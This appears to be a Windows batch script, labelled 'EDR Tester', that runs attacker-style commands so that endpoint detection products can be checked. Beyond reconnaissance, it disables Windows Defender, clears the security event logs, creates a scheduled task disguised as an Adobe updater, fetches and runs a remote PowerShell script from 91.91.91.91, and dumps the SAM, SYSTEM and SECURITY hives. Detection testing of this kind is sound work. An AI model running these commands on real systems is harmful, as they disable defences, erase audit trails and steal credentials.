@ECHO OFF 
:: This batch file wants to check your EDR systems detection and response capabilities more noisy way
TITLE EDR TESTER Runnig Now!
ECHO Please wait..until EDR Testing Script finish its Jobs, Than You should check your existing or future EDR log events.
ECHO You can use this script when you are testing various EDR and NTA products 
ECHO Please run this script administrator mode!
ECHO ********************************
ECHO *       EDR Tester v.01        *
ECHO ********************************
ECHO ============================
systeminfo | findstr /c:"OS Name"
systeminfo | findstr /c:"OS Version"
systeminfo | findstr /c:"System Type"
ECHO ============================
ECHO ============================
systeminfo | findstr /c:"Total Physical Memory"
ECHO ============================
wmic cpu get name
ECHO ============================
ECHO NETWORK INFO
ECHO ============================
ipconfig | findstr IPv4
ipconfig | findstr IPv6
ECHO ============================
net user Administrator /domain
ECHO ============================
net Accounts 
ECHO ============================
net localgroup administrators
ECHO ============================
net use
ECHO ============================
net share
ECHO ============================
net group "domain admins" /domain
ECHO ============================
net config workstation
ECHO ============================
net accounts
ECHO ============================
net continue
ECHO ============================
net localgroup
ECHO ============================
net user
ECHO ============================
NET STOP Spooler
ECHO ============================
net time
ECHO ============================
net config Workstation
ECHO ============================
net statistics Workstation
ECHO ============================
net accounts /domain
ECHO ============================
net view
ECHO ============================
net stop windefend
ECHO ============================
ver
ECHO ============================
assoc
ECHO ============================
assoc | findstr ".xml"
ECHO ============================
assoc | find ".exe"
ECHO ============================
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows"
ECHO ============================
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
ECHO ============================
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
ECHO ============================
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices
ECHO ============================
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices
ECHO ============================
reg query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify
ECHO ============================
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit
ECHO ============================
reg query HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\\Shell
ECHO ============================
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\\Shell
ECHO ============================
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\ShellServiceObjectDelayLoad
ECHO ============================
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
ECHO ============================
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnceEx
ECHO ============================
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
ECHO ============================
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
ECHO ============================
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
ECHO ============================
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
ECHO ============================
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
ECHO ============================
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
ECHO ============================
reg query hklm\system\currentcontrolset\services /s | findstr ImagePath 2>nul | findstr /Ri ".*\.sys$"
ECHO ============================
reg Query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
ECHO ============================
REG ADD HKEY_CURRENT_USER\Console /v Test /d "Test Data"
ECHO ============================
REG QUERY HKEY_CURRENT_USER\Console /v Test
ECHO ============================
REG DELETE HKEY_CURRENT_USER\Console /v Test /f
ECHO ============================
REG QUERY HKEY_CURRENT_USER\Console /v Test
ECHO ============================
wmic computersystem LIST full
ECHO ============================
cls
ECHO ============================
wmic /namespace:\\root\securitycenter2 path antivirusproduct
ECHO ============================
wmic path Win32_PnPdevice
ECHO ============================
wmic qfe list brief
ECHO ============================
wmic DATAFILE where "path='\\Users\\test\\Documents\\'" GET Name,readable,size
ECHO ============================
wmic startup list brief
ECHO ============================
wmic share list
ECHO ============================
wmic service get name,displayname,pathname,startmode
ECHO ============================
wmic process list brief
ECHO ============================
wmic process get caption,executablepath,commandline 
ECHO ============================
wmic qfe get description,installedOn /format:csv & arp -a & "cmd.exe" /C whoami
ECHO ============================
wmic qfe get description,installedOn /format:csv & arp -a & "cmd.exe" /C ipconfig /all
ECHO ============================
wmic qfe get description,installedOn /format:csv & arp -a & "cmd.exe" /C powershell exit
ECHO ============================
wmic qfe get description,installedOn /format:csv & arp -a & "cmd.exe" /C ping -n 10 google.com.tr
ECHO ============================
wmic NTDOMAIN GET DomainControllerAddress,DomainName,Roles /VALUE
ECHO ============================
wmic process call create "cmd.exe /C calc.exe"
ECHO ============================
wmic /NAMESPACE:\\root\directory\ldap PATH ds_group where "ds_samaccountname='Domain Admins'" Get ds_member /Value
ECHO ============================
route print
ECHO ============================
query session
ECHO ============================
netsh advfirewall show allprofiles
ECHO ============================
tasklist
ECHO ============================
systeminfo 
ECHO ============================
qwinsta
ECHO ============================
ipconfig /displaydns
ECHO ============================
quser
ECHO ============================
wevtutil cl application
ECHO ============================
wevtutil cl system
ECHO ============================
wevtutil cl security
ECHO ============================
taskkill /F /IM iexplore.exe
ECHO ============================
taskkill /F /IM calc.exe
ECHO ============================
taskkill /f /pid 8888
ECHO ============================
sc config "windefend" start= disabled
ECHO ============================
"schtasks" /Create /TR "CSIDL_PROFILE\appdata\roaming\adobe\adobeup.exe" /SC WEEKLY /TN "Adobe Acrobat Reader Updater"
ECHO ============================
psexec -s -i -d regedit
ECHO ============================
"powershell.exe" get-process | where {$_.Description -like "*$windefend*"}
ECHO ============================
certutil.exe -urlcache -split -f http://7-zip.org/a/7z1604-x64.exe 7zip.exe
ECHO ============================
dir /s
ECHO ============================
dir /ah
ECHO ============================
dir "C:\Program Files" > C:\lists.txt
ECHO %PATH%
ECHO ============================
netstat -ano
ECHO ============================
netstat -ano | findstr "ESTABLISHED"
ECHO ============================
driverquery
ECHO ============================
nltest /dclist:abc.local
ECHO ============================
powershell.exe -W hidden -Exec Bypass -nologo -noprofile -command "IEX(New-Object Net.WebClient).DownloadString('http://91.91.91.91:80/powershellscript')"
ECHO ============================
reg save HKLM\Security security.hive
ECHO ============================
reg save HKLM\System system.hive
ECHO ============================
reg save HKLM\SAM sam.hive
ECHO ============================
ECHO Test already Finishied  ! Happy hunting threats :)
PAUSE
